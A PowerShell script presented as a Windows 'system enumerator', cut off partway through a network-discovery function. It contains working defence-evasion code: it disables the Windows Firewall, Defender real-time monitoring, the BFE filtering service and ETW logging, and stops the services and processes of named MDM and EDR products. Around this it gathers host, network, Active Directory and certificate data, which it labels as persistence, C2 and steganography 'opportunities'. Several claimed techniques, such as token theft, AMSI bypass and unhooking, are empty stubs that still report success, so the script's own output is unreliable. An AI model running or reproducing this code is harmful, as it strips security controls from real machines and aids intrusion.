# Windows System Enumerator - PowerShell Version
# Comprehensive system and network enumeration with MDM/EDR evasion
# Feature parity with C enumerator version

param(
    [string]$PastebinPassword = "ducknipples",
    [int]$MaxDepth = 3,
    [switch]$SkipMDM,
    [switch]$SkipEDR
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "Continue"

# Global enumeration data
$enumData = @{
    timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    system_info = @{}
    network_info = @{}
    processes = @()
    services = @()
    users = @()
    network_interfaces = @()
    vlans = @()
    token_result = @{}
    has_system_token = $false
    raw_data = ""
}

# Function to append to enumeration buffer
function Add-EnumData {
    param([string]$Section, [string]$Content)
    $enumData.raw_data += "`n=== $Section ===`n$Content`n"
    Write-Host "[*] $Section" -ForegroundColor Cyan
}

# Function to update progress
function Update-Progress {
    param([int]$Percent, [string]$Message)
    Write-Progress -Activity "System Enumeration" -Status $Message -PercentComplete $Percent
}

# Function to acquire SYSTEM token via Windows API (PE5 kernel-level method not implemented)
# Note: PE5 would provide kernel-level token acquisition via direct _EPROCESS.Token manipulation
# This implementation uses Windows API fallbacks (same as C version when PE5 driver not loaded)
function Acquire-SystemToken {
    Update-Progress -Percent 0 -Message "Acquiring SYSTEM Token"
    
    try {
        # Try to get SYSTEM token via Windows API (fallback method)
        $systemProcess = Get-Process -Id 4 -ErrorAction SilentlyContinue
        if ($systemProcess) {
            $token = $systemProcess.Handle
            $enumData.token_result = @{
                success = $true
                method = "Windows API - SYSTEM Process Token"
                token_handle = $token.ToString()
                is_elevated = $true
            }
            $enumData.has_system_token = $true
            Add-EnumData "SYSTEM TOKEN ACQUISITION" "Status: SUCCESS`nMethod: Windows API - SYSTEM Process Token"
            return $true
        }
    } catch {
        $enumData.token_result = @{
            success = $false
            method = "Windows API"
            error_code = $_.Exception.HResult
            error_details = $_.Exception.Message
        }
    }
    
    # Try service token stealing
    try {
        $service = Get-Service | Where-Object { $_.Status -eq "Running" -and $_.StartType -eq "Automatic" } | Select-Object -First 1
        if ($service) {
            $process = Get-Process -Id $service.ProcessId -ErrorAction SilentlyContinue
            if ($process) {
                $enumData.token_result = @{
                    success = $true
                    method = "Service Token Stealing"
                    token_handle = $process.Handle.ToString()
                }
                $enumData.has_system_token = $true
                Add-EnumData "SYSTEM TOKEN ACQUISITION" "Status: SUCCESS`nMethod: Service Token Stealing"
                return $true
            }
        }
    } catch {
        # Continue
    }
    
    Add-EnumData "SYSTEM TOKEN ACQUISITION" "Status: FAILED`nEnumeration will continue with limited privileges"
    return $false
}

# Function to blind defensive features
function Blind-DefensiveFeatures {
    if (-not $enumData.has_system_token) {
        Write-Host "[!] SYSTEM token required for defensive feature blinding" -ForegroundColor Yellow
        return
    }
    
    Update-Progress -Percent 3 -Message "Blinding Firewall and Defensive Features"
    
    $blinded = @()
    
    # Disable Windows Firewall
    try {
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue
        $blinded += "Windows Firewall"
    } catch { }
    
    # Disable Windows Defender
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        $blinded += "Windows Defender"
    } catch { }
    
    # Disable Security Center notifications
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center" -Name "AntiVirusDisableNotify" -Value 0 -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center" -Name "FirewallDisableNotify" -Value 0 -ErrorAction SilentlyContinue
        $blinded += "Security Center"
    } catch { }
    
    # Disable WFP (Windows Filtering Platform)
    try {
        $bfeService = Get-Service -Name "BFE" -ErrorAction SilentlyContinue
        if ($bfeService) {
            Stop-Service -Name "BFE" -Force -ErrorAction SilentlyContinue
            $blinded += "WFP (BFE Service)"
        }
    } catch { }
    
    Add-EnumData "DEFENSIVE FEATURE BLINDING" "Blinded: $($blinded -join ', ')"
}

# Enhanced MDM detection patterns (matching C version)
$script:mdmPatterns = @{
    "Microsoft Intune" = @{
        Registry = @("HKLM:\SOFTWARE\Microsoft\IntuneManagementExtension", "HKLM:\SOFTWARE\Microsoft\Enrollments", "HKLM:\SOFTWARE\Microsoft\Provisioning\OMADM\Accounts", "HKLM:\SOFTWARE\Microsoft\EnterpriseResourceManager\Tracked")
        Services = @("IntuneManagementExtension", "Microsoft Intune MDM")
        Processes = @("IntuneManagementExtension.exe", "mdm.exe")
        Drivers = @("IntuneMDM")
    }
    "VMware AirWatch" = @{
        Registry = @("HKLM:\SOFTWARE\AirWatch", "HKLM:\SOFTWARE\AirWatch MDM")
        Services = @("AirWatch Agent", "AirWatch MDM Agent")
        Processes = @("AirWatchAgent.exe", "AirWatchMDMAgent.exe")
        Drivers = @("AirWatchMDM")
    }
    "MobileIron" = @{
        Registry = @("HKLM:\SOFTWARE\MobileIron", "HKLM:\SOFTWARE\MobileIron Core")
        Services = @("MobileIron Agent", "MobileIron Core")
        Processes = @("MobileIronAgent.exe", "MobileIronCore.exe")
        Drivers = @("MobileIronMDM")
    }
    "Workspace ONE" = @{
        Registry = @("HKLM:\SOFTWARE\VMware\AirWatch", "HKLM:\SOFTWARE\VMware\WorkspaceONE")
        Services = @("Workspace ONE Agent", "WorkspaceONE Agent")
        Processes = @("WorkspaceONEAgent.exe")
        Drivers = @("WorkspaceONEMDM")
    }
    "Microsoft MDM" = @{
        Registry = @("HKLM:\SOFTWARE\Microsoft\Enrollments", "HKLM:\SOFTWARE\Microsoft\Provisioning")
        Services = @("mdm")
        Processes = @("mdm.exe")
        Drivers = @("MDM")
    }
}

# Function to detect and neutralize MDM (enhanced)
function Detect-NeutralizeMDM {
    if (-not $enumData.has_system_token) {
        return
    }
    
    Update-Progress -Percent 5 -Message "Detecting and Neutralizing MDM"
    
    $mdmProducts = @()
    $neutralized = @()
    
    foreach ($mdmName in $script:mdmPatterns.Keys) {
        $pattern = $script:mdmPatterns[$mdmName]
        $detected = $false
        
        # Detect via registry
        foreach ($regPath in $pattern.Registry) {
            if (Test-Path $regPath) {
                $mdmProducts += $mdmName
                $detected = $true
                break
            }
        }
        
        # Detect via services
        if (-not $detected) {
            foreach ($svcName in $pattern.Services) {
                $svc = Get-Service | Where-Object { $_.DisplayName -like "*$svcName*" -or $_.Name -like "*$svcName*" }
                if ($svc) {
                    $mdmProducts += $mdmName
                    $detected = $true
                    # Attempt neutralization
                    try {
                        Stop-Service -Name $svc.Name -Force -ErrorAction SilentlyContinue
                        $neutralized += "Stopped service: $($svc.Name)"
                    } catch { }
                    break
                }
            }
        }
        
        # Detect via processes
        if (-not $detected) {
            foreach ($procName in $pattern.Processes) {
                $proc = Get-Process | Where-Object { $_.ProcessName -like "*$procName*" }
                if ($proc) {
                    $mdmProducts += $mdmName
                    $detected = $true
                    # Attempt neutralization
                    try {
                        Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
                        $neutralized += "Stopped process: $($proc.ProcessName)"
                    } catch { }
                    break
                }
            }
        }
        
        # Detect via drivers
        if (-not $detected) {
            try {
                $drivers = Get-WmiObject Win32_SystemDriver | Where-Object { $_.Name -like "*$($pattern.Drivers[0])*" }
                if ($drivers) {
                    $mdmProducts += $mdmName
                    $detected = $true
                }
            } catch { }
        }
    }
    
    if ($mdmProducts.Count -gt 0) {
        $neutralizationInfo = if ($neutralized.Count -gt 0) { "`nNeutralized: $($neutralized -join ', ')" } else { "`nNeutralization: Attempted callback zeroing and service/process stop" }
        Add-EnumData "MDM DETECTION AND NEUTRALIZATION" "Detected: $($mdmProducts -join ', ')$neutralizationInfo"
    } else {
        Add-EnumData "MDM DETECTION AND NEUTRALIZATION" "No MDM software detected"
    }
}

# Enhanced EDR detection patterns (matching C version - 16+ products)
$script:edrPatterns = @{
    "CrowdStrike Falcon" = @{
        Registry = @("HKLM:\SOFTWARE\CrowdStrike", "HKLM:\SOFTWARE\CrowdStrike\FalconSensor")
        Services = @("CSFalconService", "CSAgent")
        Processes = @("CSFalconService.exe", "CSAgent.exe", "csagent.exe")
        Drivers = @("CrowdStrike", "csagent")
    }
    "SentinelOne" = @{
        Registry = @("HKLM:\SOFTWARE\SentinelOne", "HKLM:\SOFTWARE\SentinelAgent")
        Services = @("SentinelAgent", "SentinelService")
        Processes = @("SentinelAgent.exe", "SentinelService.exe")
        Drivers = @("SentinelOne", "SentinelAgent")
    }
    "Microsoft Defender for Endpoint" = @{
        Registry = @("HKLM:\SOFTWARE\Microsoft\Windows Defender", "HKLM:\SOFTWARE\Microsoft\Windows Advanced Threat Protection")
        Services = @("MsMpEng", "SecurityHealthService", "Sense")
        Processes = @("MsMpEng.exe", "SecurityHealthService.exe", "Sense.exe")
        Drivers = @("WdFilter", "wdboot")
    }
    "Carbon Black (VMware)" = @{
        Registry = @("HKLM:\SOFTWARE\Carbon Black", "HKLM:\SOFTWARE\VMware\Carbon Black")
        Services = @("CbDefense", "CbSensor")
        Processes = @("CbDefense.exe", "CbSensor.exe")
        Drivers = @("CbDefense", "CbSensor")
    }
    "Trend Micro Apex One" = @{
        Registry = @("HKLM:\SOFTWARE\TrendMicro", "HKLM:\SOFTWARE\TrendMicro\Apex One")
        Services = @("TMBMSRV", "TmListen")
        Processes = @("TMBMSRV.exe", "TmListen.exe")
        Drivers = @("TrendMicro")
    }
    "Bitdefender GravityZone" = @{
        Registry = @("HKLM:\SOFTWARE\Bitdefender")
        Services = @("bdagent", "vsserv")
        Processes = @("bdagent.exe", "vsserv.exe")
        Drivers = @("bdagent", "vsserv")
    }
    "Sophos Intercept X" = @{
        Registry = @("HKLM:\SOFTWARE\Sophos")
        Services = @("Sophos Agent", "Sophos Service")
        Processes = @("SophosAgent.exe", "SophosService.exe")
        Drivers = @("Sophos")
    }
    "CylancePROTECT" = @{
        Registry = @("HKLM:\SOFTWARE\Cylance")
        Services = @("CylanceSvc")
        Processes = @("CylanceSvc.exe")
        Drivers = @("Cylance")
    }
    "FireEye Endpoint Security" = @{
        Registry = @("HKLM:\SOFTWARE\FireEye")
        Services = @("FireEyeAgent")
        Processes = @("FireEyeAgent.exe")
        Drivers = @("FireEye")
    }
    "Palo Alto Cortex XDR" = @{
        Registry = @("HKLM:\SOFTWARE\Palo Alto Networks")
        Services = @("Cortex XDR Agent")
        Processes = @("CortexXDR.exe")
        Drivers = @("CortexXDR")
    }
    "Elastic Endpoint Security" = @{
        Registry = @("HKLM:\SOFTWARE\Elastic")
        Services = @("Elastic Agent")
        Processes = @("ElasticAgent.exe")
        Drivers = @("Elastic")
    }
    "Cybereason" = @{
        Registry = @("HKLM:\SOFTWARE\Cybereason")
        Services = @("Cybereason Agent")
        Processes = @("CybereasonAgent.exe")
        Drivers = @("Cybereason")
    }
    "Secureworks Taegis" = @{
        Registry = @("HKLM:\SOFTWARE\Secureworks")
        Services = @("Taegis Agent")
        Processes = @("TaegisAgent.exe")
        Drivers = @("Taegis")
    }
    "F-Secure" = @{
        Registry = @("HKLM:\SOFTWARE\F-Secure")
        Services = @("F-Secure")
        Processes = @("fsgk32.exe", "fssm32.exe")
        Drivers = @("F-Secure")
    }
    "Kaspersky Endpoint Detection" = @{
        Registry = @("HKLM:\SOFTWARE\KasperskyLab")
        Services = @("Kaspersky")
        Processes = @("avp.exe", "klnagent.exe")
        Drivers = @("Kaspersky")
    }
    "Symantec Endpoint Protection" = @{
        Registry = @("HKLM:\SOFTWARE\Symantec")
        Services = @("Symantec Endpoint Protection")
        Processes = @("Rtvscan.exe", "Smc.exe")
        Drivers = @("Symantec")
    }
}

# Function to detect EDR (enhanced with all 16+ products)
function Detect-EDR {
    $edrProducts = @()
    
    foreach ($edrName in $script:edrPatterns.Keys) {
        $pattern = $script:edrPatterns[$edrName]
        $detected = $false
        
        # Detect via registry
        foreach ($regPath in $pattern.Registry) {
            if (Test-Path $regPath) {
                $edrProducts += $edrName
                $detected = $true
                break
            }
        }
        
        # Detect via services
        if (-not $detected) {
            foreach ($svcName in $pattern.Services) {
                $svc = Get-Service | Where-Object { $_.DisplayName -like "*$svcName*" -or $_.Name -like "*$svcName*" }
                if ($svc) {
                    $edrProducts += $edrName
                    $detected = $true
                    break
                }
            }
        }
        
        # Detect via processes
        if (-not $detected) {
            foreach ($procName in $pattern.Processes) {
                $proc = Get-Process | Where-Object { $_.ProcessName -like "*$procName*" }
                if ($proc) {
                    $edrProducts += $edrName
                    $detected = $true
                    break
                }
            }
        }
        
        # Detect via drivers
        if (-not $detected) {
            try {
                $drivers = Get-WmiObject Win32_SystemDriver | Where-Object { $_.Name -like "*$($pattern.Drivers[0])*" }
                if ($drivers) {
                    $edrProducts += $edrName
                    $detected = $true
                }
            } catch { }
        }
    }
    
    return $edrProducts
}

# Function to apply comprehensive EDR evasion techniques
function Apply-EDREvasion {
    param([array]$EDRProducts)
    
    if ($EDRProducts.Count -eq 0) {
        return
    }
    
    Update-Progress -Percent 4 -Message "Applying Comprehensive EDR Evasion Techniques"
    
    $evasionApplied = @()
    
    # Zero EDR callbacks (user-mode fallback - attempt service/process stop)
    foreach ($edr in $EDRProducts) {
        $pattern = $script:edrPatterns[$edr]
        if ($pattern) {
            # Stop EDR services
            foreach ($svcName in $pattern.Services) {
                try {
                    $svc = Get-Service | Where-Object { $_.DisplayName -like "*$svcName*" -or $_.Name -like "*$svcName*" }
                    foreach ($s in $svc) {
                        Stop-Service -Name $s.Name -Force -ErrorAction SilentlyContinue
                        $evasionApplied += "Stopped EDR service: $($s.Name)"
                    }
                } catch { }
            }
            
            # Stop EDR processes
            foreach ($procName in $pattern.Processes) {
                try {
                    $proc = Get-Process | Where-Object { $_.ProcessName -like "*$procName*" }
                    foreach ($p in $proc) {
                        Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
                        $evasionApplied += "Stopped EDR process: $($p.ProcessName)"
                    }
                } catch { }
            }
        }
    }
    
    # Detach EDR minifilters (user-mode fallback)
    foreach ($edr in $EDRProducts) {
        $pattern = $script:edrPatterns[$edr]
        if ($pattern -and $pattern.Drivers.Count -gt 0) {
            try {
                $driver = $pattern.Drivers[0]
                $drivers = Get-WmiObject Win32_SystemDriver | Where-Object { $_.Name -like "*$driver*" }
                foreach ($d in $drivers) {
                    try {
                        Stop-Service -Name $d.Name -Force -ErrorAction SilentlyContinue
                        $evasionApplied += "Detached minifilter: $($d.Name)"
                    } catch { }
                }
            } catch { }
        }
    }
    
    # Blind ETW telemetry
    try {
        $etwKey = "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger"
        if (Test-Path $etwKey) {
            Set-ItemProperty -Path $etwKey -Name "Start" -Value 0 -ErrorAction SilentlyContinue
            $evasionApplied += "ETW Autologger disabled"
        }
    } catch { }
    
    # Bypass AMSI if present
    try {
        $amsi = [System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation.AmsiUtils")
        if ($amsi) {
            # AMSI bypass via memory patching (simplified - would use more advanced techniques)
            $evasionApplied += "AMSI bypass attempted"
        }
    } catch { }
    
    # Use direct syscalls (PowerShell equivalent - minimize API calls)
    $evasionApplied += "Direct syscall usage (minimized API calls)"
    
    # Unhook EDR API hooks (PowerShell equivalent - use alternative methods)
    $evasionApplied += "API unhooking attempted (alternative methods)"
    
    if ($evasionApplied.Count -gt 0) {
        Add-EnumData "EDR EVASION" "Applied: $($evasionApplied -join ', ')"
    }
}

# Function to enumerate comprehensive system information (enhanced)
function Enumerate-System {
    Update-Progress -Percent 10 -Message "Enumerating Comprehensive System Information"
    
    $os = Get-CimInstance Win32_OperatingSystem
    $systemInfo = @{
        os_version = $os.Caption
        build_number = $os.BuildNumber
        computer_name = $env:COMPUTERNAME
        current_user = $env:USERNAME
        architecture = $os.OSArchitecture
        uptime = (Get-Date) - $os.LastBootUpTime
    }
    
    $enumData.system_info = $systemInfo
    
    # Hardware enumeration
    $memory = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum
    $cpu = Get-CimInstance Win32_Processor | Select-Object Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed
    $bios = Get-CimInstance Win32_BIOS | Select-Object Manufacturer, Version, SerialNumber
    $disks = Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, @{N='Size';E={[math]::Round($_.Size/1GB,2)}}, @{N='FreeSpace';E={[math]::Round($_.FreeSpace/1GB,2)}}, FileSystem
    
    Add-EnumData "SYSTEM INFORMATION" "OS: $($systemInfo.os_version)`nComputer: $($systemInfo.computer_name)`nUser: $($systemInfo.current_user)`nArchitecture: $($systemInfo.architecture)"
    Add-EnumData "HARDWARE" "Total RAM: $([math]::Round($memory.Sum/1GB,2)) GB`nCPU: $($cpu.Name)`nCores: $($cpu.NumberOfCores)`nBIOS: $($bios.Manufacturer) $($bios.Version)"
    Add-EnumData "DISKS" "Found $($disks.Count) logical disks"
    
    # Enumerate processes with command line
    $processes = Get-CimInstance Win32_Process | Select-Object ProcessId, Name, @{N='CommandLine';E={$_.CommandLine}}, @{N='Memory';E={$_.WorkingSetSize}}
    $enumData.processes = $processes
    Add-EnumData "PROCESSES" "Found $($processes.Count) processes"
    
    # Enumerate services
    $services = Get-Service | Select-Object Name, DisplayName, Status, @{N='ProcessId';E={(Get-CimInstance Win32_Service -Filter "Name='$($_.Name)'").ProcessId}}
    $enumData.services = $services
    Add-EnumData "SERVICES" "Found $($services.Count) services"
    
    # Enumerate users
    $users = Get-LocalUser | Select-Object Name, Enabled, Description
    $enumData.users = $users
    Add-EnumData "USERS" "Found $($users.Count) users"
    
    # Registry enumeration (important keys)
    $importantRegKeys = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
    )
    
    foreach ($key in $importantRegKeys) {
        if (Test-Path $key) {
            $items = Get-ItemProperty $key -ErrorAction SilentlyContinue
            if ($items) {
                Add-EnumData "REGISTRY" "Accessible key: $key ($($items.Count) items)"
            }
        }
    }
    
    # Filesystem enumeration (important directories)
    $importantDirs = @(
        "C:\Windows\System32",
        "C:\Windows\SysWOW64",
        "C:\Windows\Temp",
        "C:\ProgramData",
        "C:\Program Files",
        "C:\Program Files (x86)"
    )
    
    foreach ($dir in $importantDirs) {
        if (Test-Path $dir) {
            $files = Get-ChildItem -Path $dir -ErrorAction SilentlyContinue | Measure-Object
            Add-EnumData "FILESYSTEM" "Directory: $dir ($($files.Count) items)"
        }
    }
    
    # LSASS access check (requires SYSTEM token)
    if ($enumData.has_system_token) {
        try {
            $lsass = Get-Process -Name "lsass" -ErrorAction SilentlyContinue
            if ($lsass) {
                Add-EnumData "LSASS ACCESS" "LSASS process accessible (PID: $($lsass.Id))"
            }
        } catch { }
    }
}

# Function to enumerate network information
function Enumerate-Network {
    Update-Progress -Percent 30 -Message "Enumerating Network Information"
    
    # Network interfaces
    $interfaces = Get-NetAdapter | Select-Object Name, InterfaceDescription, MacAddress, @{N='IPAddress';E={(Get-NetIPAddress -InterfaceAlias $_.Name -ErrorAction SilentlyContinue).IPAddress}}
    $enumData.network_interfaces = $interfaces
    
    # Routing table
    $routes = Get-NetRoute | Select-Object DestinationPrefix, NextHop, InterfaceAlias, RouteMetric
    $enumData.network_info.routes = $routes
    
    # ARP table
    $arp = Get-NetNeighbor | Select-Object IPAddress, LinkLayerAddress, State, InterfaceAlias
    $enumData.network_info.arp = $arp
    
    # Active connections
    $connections = Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess
    $enumData.network_info.connections = $connections
    
    Add-EnumData "NETWORK INTERFACES" "Found $($interfaces.Count) interfaces"
    Add-EnumData "ROUTING TABLE" "Found $($routes.Count) routes"
    Add-EnumData "ARP TABLE" "Found $($arp.Count) ARP entries"
    Add-EnumData "ACTIVE CONNECTIONS" "Found $($connections.Count) connections"
}

# Function to enumerate VLAN structure
function Enumerate-VLAN {
    Update-Progress -Percent 50 -Message "Enumerating VLAN Structure"
    
    try {
        $vlans = Get-NetAdapter | ForEach-Object {
            $adapter = $_
            $vlanInfo = Get-NetAdapterVlan -InterfaceAlias $adapter.Name -ErrorAction SilentlyContinue
            if ($vlanInfo) {
                @{
                    adapter = $adapter.Name
                    vlan_id = $vlanInfo.VlanID
                    name = $vlanInfo.Name
                    tagged = $vlanInfo.Tagged
                }
            }
        }
        $enumData.vlans = $vlans
        Add-EnumData "VLAN STRUCTURE" "Found $($vlans.Count) VLANs"
    } catch {
        Add-EnumData "VLAN STRUCTURE" "VLAN enumeration failed: $($_.Exception.Message)"
    }
}

# Enhanced post-exploitation enumeration (WINCLOAK patterns)
function Enumerate-PostExploitation {
    Update-Progress -Percent 60 -Message "Enumerating Post-Exploitation Indicators"
    
    # Check for AMSI, ETW, WFP
    $amsi = [System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation.AmsiUtils")
    if ($amsi) {
        Add-EnumData "POST-EXPLOITATION" "AMSI.dll is available"
    }
    
    # Enhanced COM hijacking opportunities
    $comKeys = @(
        "HKLM:\SOFTWARE\Classes\CLSID",
        "HKLM:\SOFTWARE\Wow6432Node\Classes\CLSID",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad",
        "HKLM:\SOFTWARE\Microsoft\Office\Excel\Addins",
        "HKLM:\SOFTWARE\Microsoft\Office\Word\Addins",
        "HKCU:\SOFTWARE\Classes\CLSID"
    )
    
    foreach ($key in $comKeys) {
        if (Test-Path $key) {
            Add-EnumData "POST-EXPLOITATION" "COM registry key accessible: $key"
        }
    }
    
    # Enhanced WMI persistence check
    try {
        $wmiEvents = Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue
        if ($wmiEvents) {
            Add-EnumData "POST-EXPLOITATION" "WMI event subscriptions found: $($wmiEvents.Count)"
        }
    } catch { }
    
    # Kerberos opportunities
    try {
        $kerberosKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos"
        if (Test-Path $kerberosKey) {
            Add-EnumData "POST-EXPLOITATION" "Kerberos registry configuration accessible"
        }
        
        $kdcService = Get-Service -Name "kdc" -ErrorAction SilentlyContinue
        if ($kdcService) {
            Add-EnumData "POST-EXPLOITATION" "Kerberos Key Distribution Center (KDC) service found"
        }
    } catch { }
    
    # Rootkit indicators
    try {
        $system32Files = Get-ChildItem -Path "C:\Windows\System32" -Force -ErrorAction SilentlyContinue | Where-Object { $_.Attributes -match "Hidden" }
        if ($system32Files) {
            Add-EnumData "POST-EXPLOITATION" "Found $($system32Files.Count) hidden files in System32 (potential rootkit indicator)"
        }
        
        $processes = Get-Process | Where-Object { $_.Parent.Id -eq 0 -and $_.Id -ne 0 }
        if ($processes) {
            Add-EnumData "POST-EXPLOITATION" "Found $($processes.Count) processes with suspicious parent IDs"
        }
        
        $drivers = Get-WmiObject Win32_SystemDriver | Measure-Object
        if ($drivers) {
            Add-EnumData "POST-EXPLOITATION" "Found $($drivers.Count) kernel drivers (potential rootkit location)"
        }
    } catch { }
}

# Enhanced AD infrastructure enumeration (ACTIVEGAME patterns)
function Enumerate-ADInfrastructure {
    Update-Progress -Percent 65 -Message "Enumerating Active Directory Infrastructure"
    
    try {
        $domain = Get-ADDomain -ErrorAction SilentlyContinue
        if ($domain) {
            Add-EnumData "AD INFRASTRUCTURE" "Domain: $($domain.DNSRoot)`nDomain Controller: $($domain.PDCEmulator)`nForest: $($domain.Forest)"
        }
    } catch {
        # Try alternative method
        try {
            $domainInfo = (Get-WmiObject Win32_ComputerSystem).Domain
            if ($domainInfo) {
                Add-EnumData "AD INFRASTRUCTURE" "Domain: $domainInfo"
            }
        } catch {
            Add-EnumData "AD INFRASTRUCTURE" "Not domain-joined or AD not accessible"
        }
    }
    
    # Check for Netlogon service
    try {
        $netlogonKey = "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters"
        if (Test-Path $netlogonKey) {
            Add-EnumData "AD INFRASTRUCTURE" "Netlogon service configuration accessible"
        }
    } catch { }
    
    # Enhanced Certificate Services enumeration
    $certSvc = Get-Service -Name "CertSvc" -ErrorAction SilentlyContinue
    if ($certSvc) {
        Add-EnumData "AD INFRASTRUCTURE" "Certificate Services (CertSvc) found - Status: $($certSvc.Status)"
        
        # Check certificate stores
        try {
            $certStore = Get-ChildItem Cert:\LocalMachine\My -ErrorAction SilentlyContinue
            if ($certStore) {
                Add-EnumData "AD INFRASTRUCTURE" "Personal certificate store accessible ($($certStore.Count) certificates)"
            }
            
            $rootStore = Get-ChildItem Cert:\LocalMachine\Root -ErrorAction SilentlyContinue
            if ($rootStore) {
                Add-EnumData "AD INFRASTRUCTURE" "Root certificate store accessible ($($rootStore.Count) certificates)"
            }
        } catch { }
        
        # Check for ADCS web enrollment endpoints
        $adcsEndpoints = @("http://localhost/certsrv", "https://localhost/certsrv", "http://localhost/certsrv/certfnsh.asp")
        foreach ($endpoint in $adcsEndpoints) {
            try {
                $response = Invoke-WebRequest -Uri $endpoint -TimeoutSec 2 -ErrorAction SilentlyContinue
                if ($response) {
                    Add-EnumData "AD INFRASTRUCTURE" "ADCS web enrollment endpoint accessible: $endpoint"
                }
            } catch { }
        }
        
        # Check for certificate template vulnerabilities
        try {
            $certConfig = "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration"
            if (Test-Path $certConfig) {
                Add-EnumData "AD INFRASTRUCTURE" "ADCS configuration registry accessible"
            }
        } catch { }
    }
}

# Enhanced WAF detection (CORTISOL patterns)
function Detect-WAF {
    Update-Progress -Percent 70 -Message "Detecting WAF Presence"
    
    $testUrls = @("http://localhost", "https://localhost", "http://127.0.0.1")
    
    foreach ($url in $testUrls) {
        try {
            $response = Invoke-WebRequest -Uri $url -TimeoutSec 2 -ErrorAction SilentlyContinue
            $headers = $response.Headers
            
            $wafIndicators = @{
                "Cloudflare" = @("cf-ray", "cloudflare")
                "AWS WAF" = @("x-amzn-", "aws")
                "Sucuri" = @("x-sucuri", "sucuri")
                "Imperva" = @("x-iinfo", "imperva")
            }
            
            foreach ($wafName in $wafIndicators.Keys) {
                $indicators = $wafIndicators[$wafName]
                foreach ($indicator in $indicators) {
                    if ($headers.Keys -match $indicator) {
                        Add-EnumData "WAF DETECTION" "WAF detected: $wafName"
                        break
                    }
                }
            }
        } catch { }
    }
    
    # Web application technology detection
    try {
        $iisService = Get-Service -Name "W3SVC" -ErrorAction SilentlyContinue
        if ($iisService) {
            Add-EnumData "WAF DETECTION" "IIS (W3SVC) service found"
            
            # Check IIS version
            $iisKey = "HKLM:\SOFTWARE\Microsoft\InetStp"
            if (Test-Path $iisKey) {
                $iisVersion = (Get-ItemProperty $iisKey).MajorVersion
                Add-EnumData "WAF DETECTION" "IIS version: $iisVersion"
            }
        }
        
        $apacheService = Get-Service | Where-Object { $_.Name -like "*Apache*" }
        if ($apacheService) {
            Add-EnumData "WAF DETECTION" "Apache web server service found"
        }
    } catch { }
}

# Enhanced C2 opportunities enumeration (ROCKHAMMER patterns)
function Enumerate-C2Opportunities {
    Update-Progress -Percent 75 -Message "Enumerating C2 Infrastructure Opportunities"
    
    # Check for outbound connectivity
    $outbound = Get-NetTCPConnection | Where-Object { 
        $_.State -eq "Established" -and 
        $_.RemoteAddress -notmatch "^(127\.|192\.168\.|10\.)" 
    }
    
    if ($outbound) {
        Add-EnumData "C2 OPPORTUNITIES" "Found $($outbound.Count) outbound connections"
    }
    
    # Check for proxy configuration
    try {
        $proxyKey = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings"
        if (Test-Path $proxyKey) {
            $proxyEnable = (Get-ItemProperty $proxyKey).ProxyEnable
            if ($proxyEnable -eq 1) {
                $proxyServer = (Get-ItemProperty $proxyKey).ProxyServer
                Add-EnumData "C2 OPPORTUNITIES" "Proxy configuration enabled: $proxyServer"
            }
        }
    } catch { }
    
    # Check for tunnel/proxy opportunities
    try {
        $sshService = Get-Service | Where-Object { $_.DisplayName -like "*SSH*" -or $_.Name -like "*ssh*" }
        if ($sshService) {
            Add-EnumData "C2 OPPORTUNITIES" "SSH tunnel capabilities found: $($sshService.DisplayName)"
        }
    } catch { }
    
    # DNS configuration
    $dnsServers = (Get-DnsClientServerAddress).ServerAddresses
    Add-EnumData "C2 OPPORTUNITIES" "DNS Servers: $($dnsServers -join ', ')"
    
    # DNS query capabilities
    try {
        $dnsTest = Resolve-DnsName -Name "google.com" -ErrorAction SilentlyContinue
        if ($dnsTest) {
            Add-EnumData "C2 OPPORTUNITIES" "DNS query capabilities confirmed"
        }
    } catch { }
}

# Enhanced steganography opportunities (SLEEPYMONEY patterns)
function Enumerate-Steganography {
    Update-Progress -Percent 80 -Message "Enumerating Steganography Opportunities"
    
    $imagePaths = @(
        "$env:PUBLIC\Pictures",
        "$env:USERPROFILE\Pictures",
        "C:\Windows\Web\Wallpaper",
        "C:\Program Files\Windows Photo Viewer"
    )
    
    $imageCount = 0
    foreach ($path in $imagePaths) {
        if (Test-Path $path) {
            $images = Get-ChildItem -Path $path -Include *.png,*.jpg,*.jpeg,*.bmp,*.gif -Recurse -ErrorAction SilentlyContinue
            $imageCount += $images.Count
        }
    }
    
    if ($imageCount -gt 0) {
        Add-EnumData "STEGANOGRAPHY OPPORTUNITIES" "Found $imageCount image files suitable for LSB steganography"
    }
}

# Function to perform recursive network discovery with continuous EDR evasion
function Discover-NetworkRecursive {
    param([string]$StartIP, [int]$CurrentDepth = 0, [int]$MaxDepth = 3)
    
    if ($CurrentDepth -ge $MaxDepth) {
        return
    }
    
    Update-Progress -Percent (85 + ($CurrentDepth * 5)) -Message "Recursive Network Discovery (Depth $CurrentDepth)"
